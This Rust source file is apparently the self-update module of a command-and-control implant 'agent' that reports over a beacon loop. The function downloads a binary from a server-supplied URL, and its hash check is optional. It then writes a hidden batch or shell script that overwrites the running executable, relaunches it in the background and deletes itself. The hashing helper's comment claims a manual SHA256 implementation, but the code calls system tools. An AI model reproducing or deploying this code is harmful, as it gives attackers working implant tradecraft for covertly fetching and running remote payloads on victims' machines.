/// Self-update: download a new agent binary, verify its hash, and replace the running executable.
/// Feature-gated behind `self_update`.

use super::TaskResult;
use std::io::Read;

pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let url = match args.get("url").and_then(|v| v.as_str()) {
        Some(u) if !u.is_empty() => u,
        _ => return TaskResult::error(task_id, "missing url".into()),
    };
    let expected_hash = args.get("hash").and_then(|v| v.as_str()).unwrap_or("");

    // 1. Get current exe path
    let current_exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => return TaskResult::error(task_id, format!("current_exe: {}", e)),
    };

    // 2. Download new binary to temp
    let temp_path = std::env::temp_dir().join("sg_update.tmp");
    let resp = match ureq::get(url).call() {
        Ok(r) => r,
        Err(e) => return TaskResult::error(task_id, format!("download: {}", e)),
    };
    let mut bytes = Vec::new();
    if let Err(e) = resp.into_reader().read_to_end(&mut bytes) {
        return TaskResult::error(task_id, format!("read body: {}", e));
    }

    // 3. Verify SHA256 hash if provided
    if !expected_hash.is_empty() {
        let computed = sha256_hex(&bytes);
        if computed != expected_hash.to_lowercase() {
            return TaskResult::error(
                task_id,
                format!("hash mismatch: expected {} got {}", expected_hash, computed),
            );
        }
    }

    // 4. Write to temp file
    if let Err(e) = std::fs::write(&temp_path, &bytes) {
        return TaskResult::error(task_id, format!("write temp: {}", e));
    }

    // 5. Platform-specific replacement and relaunch
    #[cfg(target_os = "windows")]
    {
        // Create a batch script that waits for us to exit, replaces, and relaunches
        let script = format!(
            "@echo off\r\ntimeout /t 2 /nobreak >nul\r\ncopy /y \"{}\" \"{}\" >nul\r\nstart \"\" \"{}\"\r\ndel \"%~f0\"\r\n",
            temp_path.display(),
            current_exe.display(),
            current_exe.display()
        );
        let script_path = std::env::temp_dir().join("sg_update.bat");
        if let Err(e) = std::fs::write(&script_path, &script) {
            return TaskResult::error(task_id, format!("write script: {}", e));
        }
        let _ = crate::utils::helpers::hidden_command("cmd")
            .args(&["/c", "start", "/min", "", &script_path.to_string_lossy()])
            .spawn();
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Unix: make executable, write a shell script to replace and relaunch
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&temp_path, std::fs::Permissions::from_mode(0o755));
        let script = format!(
            "#!/bin/sh\nsleep 2\ncp -f '{}' '{}'\nchmod +x '{}'\nnohup '{}' &\nrm -f \"$0\"\n",
            temp_path.display(),
            current_exe.display(),
            current_exe.display(),
            current_exe.display()
        );
        let script_path = std::env::temp_dir().join("sg_update.sh");
        let _ = std::fs::write(&script_path, &script);
        let _ = std::fs::set_permissions(&script_path, std::fs::Permissions::from_mode(0o755));
        let _ = crate::utils::helpers::hidden_command("sh")
            .arg(&script_path)
            .spawn();
    }

    // 6. Signal success — the beacon loop should send this result then we exit
    TaskResult::success(task_id, "update initiated, restarting".into())
}

/// Compute SHA256 hex digest without external crate (uses manual implementation).
fn sha256_hex(data: &[u8]) -> String {
    // We'll use a minimal SHA256 implementation since we don't want another dependency.
    // The agent already has the aes-gcm crate which pulls in sha2 indirectly,
    // but to be safe we do a simple computation.
    use std::process::Command;

    // Try using system tools first
    #[cfg(target_os = "windows")]
    {
        // Use certutil on Windows
        let temp = std::env::temp_dir().join("sg_hash_check.tmp");
        let _ = std::fs::write(&temp, data);
        if let Ok(output) = Command::new("certutil")
            .args(&["-hashfile", &temp.to_string_lossy(), "SHA256"])
            .output()
        {
            let _ = std::fs::remove_file(&temp);
            let stdout = String::from_utf8_lossy(&output.stdout);
            // certutil output has hash on the second line
            if let Some(hash_line) = stdout.lines().nth(1) {
                return hash_line.trim().replace(" ", "").to_lowercase();
            }
        }
        let _ = std::fs::remove_file(&temp);
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Use sha256sum on Linux/macOS
        let temp = std::env::temp_dir().join("sg_hash_check.tmp");
        let _ = std::fs::write(&temp, data);
        let cmd = if cfg!(target_os = "macos") { "shasum" } else { "sha256sum" };
        let args: Vec<&str> = if cfg!(target_os = "macos") {
            vec!["-a", "256", &temp.to_str().unwrap_or("")]
        } else {
            vec![temp.to_str().unwrap_or("")]
        };
        if let Ok(output) = Command::new(cmd).args(&args).output() {
            let _ = std::fs::remove_file(&temp);
            let stdout = String::from_utf8_lossy(&output.stdout);
            if let Some(hash) = stdout.split_whitespace().next() {
                return hash.to_lowercase();
            }
        }
        let _ = std::fs::remove_file(&temp);
    }

    "unknown".to_string()
}
